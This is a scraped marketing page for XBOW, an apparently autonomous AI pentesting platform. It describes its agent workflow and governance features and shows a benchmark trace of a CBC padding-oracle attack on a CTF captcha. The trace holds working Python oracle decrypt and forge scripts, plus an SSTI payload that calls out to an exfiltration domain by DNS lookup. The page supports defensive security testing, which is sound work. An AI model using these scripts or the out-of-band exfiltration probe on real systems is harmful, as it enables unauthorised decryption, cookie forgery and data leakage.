---
url: https://xbow.com/platform
category: product
title: AI Penetration Testing Platform | Continuous Offensive Security & Testing | XBOW
---

# AI Penetration Testing Platform | Continuous Offensive Security & Testing | XBOW

**Meta description:** Autonomous offensive security platform delivering the depth and results of a premium pentest in a fraction of the time, continuously uncovering and validating exploitable risk.

**og:image:** https://cdn.sanity.io/images/1lq2ca9s/production/71b08e2cf105b7c62dbe007896960fe9fc6d5813-1200x630.png

## Summary
This is XBOW's core "Platform" page, describing an autonomous AI penetration-testing product that runs continuous, agent-driven pentests against a customer's applications and infrastructure. It walks through XBOW's 5-step methodology (Learn, Map, Coordinate, Attack, Prove), showcases a detailed worked example ("Breaking a Cryptographic Captcha With a CBC Padding Oracle") including raw exploit code, and lays out production-readiness/governance features (scoping, safe validation, auditability, board-ready reporting, compliance controls) plus an API for programmatic/continuous pentesting. The page ends with a compliance-framework badge strip and calls to action to get a demo.

## Full content

### Hero
"Hire the Whole Leaderboard. As Many As You Want."
XBOW extends your team with autonomous hackers that discover, chain, and exploit vulnerabilities across your attack surface, and prove every finding with a working exploit. No scheduling. No waiting for the next pentest window. Point it at a target and it goes.
CTA: "Get a Demo"

Nav items: Platform, Pricing, Resources, Blog, Company, Get a Demo

### Point it at a URL. Get back working exploits.
XBOW runs the entire pentest autonomously and continuously, from the context you give it to a confirmed, working exploit, every time your applications change.

1. **Learn.** You point XBOW at a target and hand it whatever context you have: docs, credentials, API specs, architecture notes. The more you give it, the deeper it goes.
2. **Map.** XBOW builds a live map of your attack surface: applications, endpoints, parameters, auth flows.
3. **Coordinate.** A coordinator decides what to test, where, and in what order, then directs the effort across the fleet.
4. **Attack.** Thousands of agents attack in parallel. They reason through and chain vulnerabilities with an extensive offensive toolkit to reach the non-obvious paths scanners never find. This is exploitation, not pattern-matching.
5. **Prove.** Independent validators confirm exploitability, eliminating false positives that can result from AI hallucinations.

### An extension of your offensive team, built from specialized agents.
- **Orchestrated Exploration.** Coordinator provides ongoing orchestration and a decision engine. It debriefs agents and prioritizes.
- **Focused Execution.** Autonomous agents are short-lived, focused attack workers, retired after each mission to avoid bias.
- **Real-World Attacks.** An extensive offensive toolkit: industry-standard and custom tools, a steerable headless browser.
- **Independent Proof.** Validators verify that the exploits are reproducible, minimizing false positives.
- **Actionable Results.** Verified findings, clear evidence, developer-ready remediation, and reporting your board and auditors accept.

### Open a finding. See the whole attack.
Every finding is a complete, reproducible trace: the chained attack path, the working exploit, and a full log of every decision and tactic the agents took. Nothing is hidden behind a severity score. You see the whole kill chain.

Trace/example carousel (titles, presumably linking to detailed writeups):
- Breaking a Cryptographic Captcha With a CBC Padding Oracle
- Exploiting Insecure Direct Object Reference (IDOR) in a GraphQL API
- Debugging, Testing, and Refining a Jenkins Remote Code Execution Exploit
- Researching and Implementing an Exploit for a node-jose Vulnerability
- Leveraging Weak Credentials to Exploit SSTI Vulnerabilities
- Exploiting Blind SQL Injection From Scratch
- Subverting Java Deserialization With Apache Commons
- Bypassing Filters and Exploiting Complex Cross-Site Scripting (XSS)
- Writing a Customized SHA-256 Implementation for a Hash Length Extension Attack

### Featured trace: "Breaking a Cryptographic Captcha With a CBC Padding Oracle"
Tagline: "Don't roll your own crypto—or XBOW might break it."
Description: This trace shows XBOW pulling off a classic Padding Oracle attack on an AES-CBC implementation in the novel XBOW benchmark "Bad Captcha". By manipulating the authentication cookie used by the app, XBOW is able to decrypt the secret one byte at a time and use it to register a new user.

Narrated steps shown as the trace "Summary":
1. XBOW begins by verifying the presence of the CAPTCHA cookie and understanding its structure, guessing from the size (256-bit) that it may use AES
2. XBOW begins its attempt to implement an attack to decrypt the cookie, refining its code and debugging issues it encounters
3. One of its attempts reveals that the server responds with "Invalid padding" rather than "Invalid CAPTCHA" in some cases—a crucial feature of a padding oracle vulnerability
4. After noticing that some cookie values trigger a 500 Internal Server Error, XBOW explores possible non-cryptographic attacks like SSTI
5. XBOW decides to execute a full CBC padding attack, and successfully decrypts the CAPTCHA cookie, but is unable to modify it to bypass authentication
6. It realizes that the attack needs to target the CAPTCHA input (rather than modifying the cookie), and uses the decrypted cookie to create a new user and obtain the flag

The page embeds a full interactive trace UI ("Trace Details / Summary / Traces") with the agent's own running commentary and terminal/code blocks, reproduced here as shown:

> "Based on the CTF description, we're dealing with a web application that involves a captcha and potentially a padding oracle vulnerability. The mention of 'create a user' suggests there's likely a user registration or account creation process. Given this information, our first step should be to explore the web application and understand its structure and functionality."

`$ cat trace/breaking-a-cryptographic-captcha-with-a-cbc-padding-oracle/3.bash`
`$ curl -i http://web:8000/`

> "Given our findings about the captcha cookie and the challenge hint about a padding oracle vulnerability, our next step should be to attempt a padding oracle attack. We'll start by creating a Python script that can manipulate the captcha cookie and send requests to the server. This will allow us to test for and potentially exploit the padding oracle vulnerability."

`$ cat trace/breaking-a-cryptographic-captcha-with-a-cbc-padding-oracle/12.python`
```python
import requests
import base64
from Crypto.Util.Padding import pad, unpad
from Crypto.Cipher import AES

def oracle(ciphertext):
    cookie = base64.b64encode(ciphertext).decode()
    response = requests.post(
        'http://web:8000/',
        cookies={'captcha': cookie},
        data={'csrf_token': 'dummy', 'username': 'test', 'captcha': '12345'}
    )
    return 'Invalid CAPTCHA!' not in response.text

def decrypt_block(iv, ciphertext):
    plaintext = bytearray(16)
    for i in range(15, -1, -1):
        for b in range(256):
            test_iv = bytearray(iv)
            for j in range(i + 1, 16):
                test_iv[j] ^= plaintext[j] ^ (16 - i)
            test_iv[i] = b
            if oracle(bytes(test_iv) + ciphertext):
                plaintext[i] = b ^ iv[i] ^ (16 - i)
                break
    return bytes(plaintext)

original_ciphertext = base64.b64decode("N6Y/7JROLbkAFB2oEjiqqpFL29cqLmvEAjVchSGU9MQ=")
iv, ciphertext = original_ciphertext[:16], original_ciphertext[16:]

decrypted = decrypt_block(iv, ciphertext)
print("Decrypted:", decrypted)
try:
    unpadded = unpad(decrypted, AES.block_size)
    print("Unpadded:", unpadded)
except ValueError:
    print("Failed to unpad - likely incorrect decryption")
```

> "Given that we've successfully decrypted the captcha cookie using the padding oracle attack, but haven't been able to bypass the CAPTCHA validation yet, our next step should be to attempt to forge a valid captcha cookie. We'll try to encrypt our own data using the information we've gathered from the decryption process. This might allow us to create a captcha cookie that the server will accept, effectively bypassing the CAPTCHA challenge."

`$ cat trace/breaking-a-cryptographic-captcha-with-a-cbc-padding-oracle/24.python`
```python
import requests
import base64
from Crypto.Util.Padding import pad
from Crypto.Cipher import AES

def oracle(ciphertext):
    cookie = base64.b64encode(ciphertext).decode()
    response = requests.post(
        'http://web:8000/',
        cookies={'captcha': cookie},
        data={'csrf_token': 'dummy', 'username': 'test', 'captcha': '12345'}
    )
    return 'Invalid CAPTCHA!' not in response.text

def encrypt_block(iv, plaintext):
    ciphertext = bytearray(16)
    for i in range(16):
        for b in range(256):
            test_iv = bytearray(iv)
            for j in range(i):
                test_iv[j] ^= ciphertext[j] ^ plaintext[j]
            test_iv[i] = b ^ plaintext[i]
            if oracle(bytes(test_iv) + bytes(ciphertext)):
                ciphertext[i] = b
                print(f"Found byte at position {i}: {hex(b)}")
                break
        else:
            print(f"Failed to find byte at position {i}")
    return bytes(ciphertext)

# Try to encrypt a simple plaintext
iv = b'0' * 16
plaintext = pad(b"valid_captcha", AES.block_size)

print("Starting encryption...")
encrypted = encrypt_block(iv, plaintext[:16])
if len(plaintext) > 16:
    encrypted += encrypt_block(encrypted, plaintext[16:])

forged_cookie = base64.b64encode(iv + encrypted).decode()
print("Forged captcha cookie:", forged_cookie)

# Test the forged cookie
response = requests.post(
    'http://web:8000/',
    cookies={'captcha': forged_cookie},
    data={'csrf_token': 'dummy', 'username': 'test_user', 'captcha': '12345'}
)
print("Server response:", response.text)
print("Status code:", response.status_code)
```

> "Our previous attempts have consistently resulted in a 500 Internal Server Error, indicating that we've successfully bypassed the CAPTCHA validation but are encountering an unexpected error in the application logic. Since modifying the request parameters didn't resolve the issue, we should focus on understanding what's happening on the server side. A common technique in CTF challenges is to use out-of-band communication to extract information. We can try to trigger a DNS lookup or HTTP request from the server to our controlled domain, which might reveal more about the internal error or the application's behavior."

`$ cat trace/breaking-a-cryptographic-captcha-with-a-cbc-padding-oracle/54.python`
```python
import requests
import base64

def send_request(cookie, username):
    response = requests.post(
        'http://web:8000/',
        cookies={'captcha': cookie},
        data={
            'csrf_token': 'dummy',
            'username': f'{username}{{7*7}}.cq6hc92dlrjc77eks1lghsn9pazzqtsr7.xfil.xbow.ltd',
            'captcha': '12345'
        },
        allow_redirects=False
    )
    return response.status_code, response.text

modified_cookie = "N6Y/7JROLbkAFB2oEjgAqZFL29cqLmvEAjVchSGU9MQ="

print("Attempting to trigger a DNS lookup:")
status, text = send_request(modified_cookie, "test_user")
print(f"Status: {status}")
print(f"Response: {text[:200]}...")

print("\nAttempting to trigger a DNS lookup with a different username:")
status, text = send_request(modified_cookie, "hacked_user")
print(f"Status: {status}")
print(f"Response: {text[:200]}...")
```

> "Our previous attempts at bit flipping the IV have consistently resulted in 'Invalid padding' errors, suggesting that we need a more precise approach to maintain valid padding while modifying the plaintext. Given that the challenge description mentions 'Padding Oracle FTW', we should focus on implementing a full padding oracle attack to decrypt and then re-encrypt the captcha cookie with our desired plaintext."

`$ cat trace/breaking-a-cryptographic-captcha-with-a-cbc-padding-oracle/78.python`
```python
import requests
import base64
from Crypto.Util.Padding import pad, unpad
from Crypto.Cipher import AES

def oracle(ciphertext):
    cookie = base64.b64encode(ciphertext).decode()
    response = requests.post(
        'http://web:8000/',
        cookies={'captcha': cookie},
        data={'csrf_token': 'dummy', 'username': 'test_user', 'captcha': '12345'}
    )
    return 'Invalid padding' not in response.text

def decrypt_block(iv, ciphertext):
    plaintext = bytearray(16)
    for i in range(15, -1, -1):
        for b in range(256):
            test_iv = bytearray(iv)
            for j in range(i + 1, 16):
                test_iv[j] ^= plaintext[j] ^ (16 - i)
            test_iv[i] = b
            if oracle(bytes(test_iv) + ciphertext):
                plaintext[i] = b ^ iv[i] ^ (16 - i)
                break
    return bytes(plaintext)

def encrypt_block(iv, plaintext):
    ciphertext = bytearray(16)
    for i in range(16):
        for b in range(256):
            test_iv = bytearray(iv)
            for j in range(i):
                test_iv[j] ^= ciphertext[j] ^ plaintext[j]
            test_iv[i] = b
            if oracle(bytes(test_iv) + bytes(ciphertext)):
                ciphertext[i] = b ^ plaintext[i]
                break
    return bytes(ciphertext)

original_cookie = "N6Y/7JROLbkAFB2oEjiqqpFL29cqLmvEAjVchSGU9MQ="
original_ciphertext = base64.b64decode(original_cookie)
iv, block = original_ciphertext[:16], original_ciphertext[16:]

print("Decrypting original captcha...")
decrypted = decrypt_block(iv, block)
print(f"Decrypted (hex): {decrypted.hex()}")
try:
    unpadded = unpad(decrypted, AES.block_size)
    print(f"Unpadded: {unpadded}")
except ValueError:
    print("Failed to unpad - likely incorrect decryption")

target_plaintexts = [b"valid", b"solved", b"captcha_ok", b"approved"]

for target in target_plaintexts:
    print(f"\nTrying to encrypt: {target}")
    padded_target = pad(target, AES.block_size)
    new_iv = bytes([0] * 16)  # Use a new IV filled with zeros
    new_block = encrypt_block(new_iv, padded_target)
    new_cookie = base64.b64encode(new_iv + new_block).decode()
    print(f"New cookie: {new_cookie}")

    # Try to create a user with the new cookie
    create_response = requests.post(
        'http://web:8000/',
        cookies={'captcha': new_cookie},
        data={'csrf_token': 'dummy', 'username': f'hacked_{target.decode()}', 'captcha': '12345'}
    )
    print(f"User creation attempt - Status: {create_response.status_code}")
    print(f"User creation attempt - Response: {create_response.text[:200]}...")

print("\nPadding oracle attack completed. Check the output for successful or interesting responses.")
```

> "Given our current knowledge and the challenge description, we've exhausted direct manipulation of the captcha cookie without success. The hint 'Captcha is impossible to read in full' suggests that we might not need to fully solve or bypass the CAPTCHA. Instead, we should focus on understanding how the application processes and validates the user input, particularly the relationship between the captcha cookie and the user-submitted captcha value. We need to explore the application's behavior with various combinations of captcha cookie values and user inputs."

`$ cat trace/breaking-a-cryptographic-captcha-with-a-cbc-padding-oracle/90.python`
```python
import requests
import string
import random

def send_request(captcha_value, username='test_user'):
    response = requests.post(
        'http://web:8000/',
        cookies={'captcha': 'N6Y/7JROLbkAFB2oEjiqqpFL29cqLmvEAjVchSGU9MQ='},  # Use original cookie
        data={'csrf_token': 'dummy', 'username': username, 'captcha': captcha_value},
        allow_redirects=False
    )
    return response.status_code, response.text

print("Testing various captcha inputs:")

# Test specific values
specific_values = ['', '12345', 'valid', 'solved', 'captcha_ok', 'approved']
for value in specific_values:
    status, text = send_request(value)
    print(f"\nCaptcha value: '{value}'")
    print(f"Status: {status}")
    print(f"Response: {text[:200]}...")

# Test random strings
for i in range(5):
    random_value = ''.join(random.choices(string.ascii_letters + string.digits, k=5))
    status, text = send_request(random_value)
    print(f"\nRandom captcha value: '{random_value}'")
    print(f"Status: {status}")
    print(f"Response: {text[:200]}...")

# Test very long input
long_value = 'A' * 1000
status, text = send_request(long_value)
print(f"\nLong captcha value (1000 'A's)")
print(f"Status: {status}")
print(f"Response: {text[:200]}...")

# Test special characters
special_chars = '!@#$%^&*()_+-=[]{}|;:,.<>?'
status, text = send_request(special_chars)
print(f"\nSpecial characters captcha value: '{special_chars}'")
print(f"Status: {status}")
print(f"Response: {text[:200]}...")

print("\nTesting completed. Check the output for interesting responses.")
```

### Put XBOW in your pipeline.
Your applications and attack surface change every day. The XBOW API launches pentests programmatically and at scale, across everything you ship, so you find and prove the flaws attackers would actually exploit, on your own release cadence.
CTAs: "Explore the API", "Read the API Reference"

### Frontier models find vulnerabilities. A platform proves them.
Frontier models are remarkable at finding possible vulnerabilities. But a model is not a pentesting platform. Proving exploitability, staying safe in production, systematically covering the attack surface, orchestrating agents at scale, controlling cost, routing across models, fitting your workflows, and earning trust: that is the platform, and the hard part to build and maintain. XBOW gives you frontier-model power with enterprise control, without owning the burden.

- **Proof, not a flood of maybes.** The harness validates every finding with a working exploit, so the model's output becomes proven risk, not more triage.
- **Safe and governed by design.** Non-destructive execution, audit trails, and review before findings surface.
- **Orchestration at scale.** Coordinate agents across your whole portfolio without duplicated work or lost coverage.
- **When frontier models improve, so do you.** XBOW routes each task to the best model and adopts new frontier models as they ship. No lock-in, no migration project, and every advance in AI capability immediately makes your testing stronger.

### Built for Production
- **Scope You Control.** You define what XBOW can test; XBOW operates within the scope you set.
- **Safe Validation.** XBOW proves exploitability with production-safe challenges designed to avoid modifying data or disrupting systems.
- **Observable and Auditable.** Every action the agents take is logged and reviewable, so your team keeps full visibility into how each finding was reached.
- **Board- and Auditor-ready Reporting.** Results come as reporting your board and auditors accept: clear evidence, severity, and remediation.
- **Deployment and Compliance Controls.** Deployment aligned to your data separation, residency, and compliance requirements (SOC 2, ISO 27001, PCI DSS, NIS 2).

### Compliance strip
"Supports 40+ leading compliance frameworks" — badges shown: SOC 2, ISO 27001, HIPAA, ISO 42001, GDPR

### Closing CTA
"Can XBOW Hack your app?" → "Get a Demo"

### Footer
© 2026 XBOW USA Inc. · Cookie Preferences
- SITEMAP: Platform, Pricing, API, Resources, About, Partner Deal Registration, AI Pentesting Hub, Documentation, Careers
- LEGAL: Terms of Use, Terms and Conditions, Privacy Policy, Trust Center, Cookies Policy
- CONNECT: Bluesky, X, Linkedin, Mastodon

## Features / claims mentioned
- Autonomous hackers that discover, chain, and exploit vulnerabilities across the attack surface, proving every finding with a working exploit
- No scheduling / no waiting for the next pentest window — continuous, on-demand testing ("point it at a target and it goes")
- 5-stage methodology: Learn → Map → Coordinate → Attack → Prove
- Ingests arbitrary context (docs, credentials, API specs, architecture notes) to go deeper
- Builds a live map of the attack surface: applications, endpoints, parameters, auth flows
- Central "coordinator" plans and directs testing across a fleet of agents
- "Thousands of agents attack in parallel," chaining vulnerabilities via an extensive offensive toolkit, reaching "non-obvious paths scanners never find"
- Positioned as "exploitation, not pattern-matching" (implicit contrast with traditional scanners)
- Independent validators confirm exploitability to eliminate false positives, including those from AI hallucinations
- Specialized/short-lived agents retired after each mission "to avoid bias"
- Steerable headless browser plus industry-standard and custom offensive tools
- Every finding delivered as a complete, reproducible trace: chained attack path, working exploit, full decision/tactic log ("you see the whole kill chain," "nothing is hidden behind a severity score")
- Example trace library covering: cryptographic padding oracle attacks, GraphQL IDOR, Jenkins RCE, node-jose vulnerability exploitation, SSTI via weak credentials, blind SQL injection, Java deserialization (Apache Commons), complex/filtered XSS, SHA-256 hash length extension attacks
- XBOW API for programmatic, at-scale, continuous pentest launches integrated into a CI/CD-like pipeline, tied to release cadence
- Positioning: "Frontier models find vulnerabilities. A platform proves them." — the platform layer (proof, safety, coverage, orchestration, cost control, model routing, workflow fit, trust) is framed as the hard/valuable part beyond a raw model
- Model-agnostic routing: "routes each task to the best model and adopts new frontier models as they ship," claiming no lock-in / no migration project
- Scope control: customer defines what XBOW can test
- Safe/non-destructive validation designed to avoid modifying data or disrupting production systems
- Full observability/auditability: every agent action logged and reviewable
- Board- and auditor-ready reporting output
- Deployment aligned to data separation, residency, and compliance requirements
- Named compliance/regulatory frameworks supported: SOC 2, ISO 27001, PCI DSS, NIS 2 (in Deployment/Compliance section) and SOC 2, ISO 27001, HIPAA, ISO 42001, GDPR (badge strip)

## Numbers & metrics mentioned
- "Supports 40+ leading compliance frameworks"
- 5-step process (Learn, Map, Coordinate, Attack, Prove)
- "Thousands of agents attack in parallel"
- CAPTCHA cookie size noted in the trace example as "256-bit" (used by XBOW to guess it may use AES)
- 6 narrated steps in the featured trace summary
- 9 example trace titles listed in the carousel
- Copyright year: © 2026 XBOW USA Inc.
- No customer counts, vulnerability counts, funding figures, benchmark percentages, or pricing figures are stated anywhere on this page

## People named
- None. No founders, researchers, leadership, or individual authors are named anywhere on this page.

## Media found
- `https://cdn.sanity.io/images/1lq2ca9s/production/71b08e2cf105b7c62dbe007896960fe9fc6d5813-1200x630.png` — og:image (social share preview image)
- `https://cdn.sanity.io/images/1lq2ca9s/production/4379afd806796cdb8b54347e98418c53f716711a-80x80.svg` — compliance badge logo, alt="SOC 2"
- `https://cdn.sanity.io/images/1lq2ca9s/production/9a0ee010d2fcaabec666234857c7f4cc99c85c39-80x80.svg` — compliance badge logo, alt="ISO 27001" (same image file also reused for alt="ISO 42001")
- `https://cdn.sanity.io/images/1lq2ca9s/production/639ee53474c8a93c016e4e35adb2fc384d9d9573-80x80.svg` — compliance badge logo, alt="HIPAA"
- `https://cdn.sanity.io/images/1lq2ca9s/production/8aba21f8f8adbe25aadeebe0783fcb7ff015faee-78x78.svg` — compliance badge logo, alt="GDPR"
- `/assets/footer-light.svg` — decorative footer background graphic (light theme variant), alt="" (served relative to xbow.com, versioned via `?dpl=` query param)
- `/assets/footer-dark.svg` — decorative footer background graphic (dark theme variant), alt=""
- `/assets/footer.svg` — decorative footer background graphic (base/hidden variant), alt=""
- No `<video>`, `<iframe>`, or embedded YouTube/Vimeo/Wistia URLs were found on the page.

## Source
https://xbow.com/platform
